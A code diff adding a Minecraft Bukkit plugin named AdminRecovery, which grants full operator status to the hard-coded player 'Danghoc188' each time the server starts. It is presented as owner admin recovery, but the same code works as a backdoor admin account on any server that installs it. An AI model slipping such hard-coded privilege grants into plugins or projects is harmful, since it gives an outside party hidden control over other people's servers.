@@ -1,0 +1,27 @@
+package me.danghoc188.adminrecovery;
+
+import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
+import org.bukkit.plugin.java.JavaPlugin;
+
+public class AdminRecovery extends JavaPlugin {
+
+    private static final String ADMIN_NAME = "Danghoc188";
+
+    @Override
+    public void onEnable() {
+        OfflinePlayer player = Bukkit.getOfflinePlayer(ADMIN_NAME);
+
+        if (!player.isOp()) {
+            player.setOp(true);
+            getLogger().info("OP da duoc khoi phuc cho " + ADMIN_NAME);
+        } else {
+            getLogger().info(ADMIN_NAME + " da la OP.");
+        }
+    }
+}
+AdminRecovery/plugin.yml
+name: AdminRecovery
+version: 1.0
+main: me.danghoc188.adminrecovery.AdminRecovery
+AdminRecovery.jar
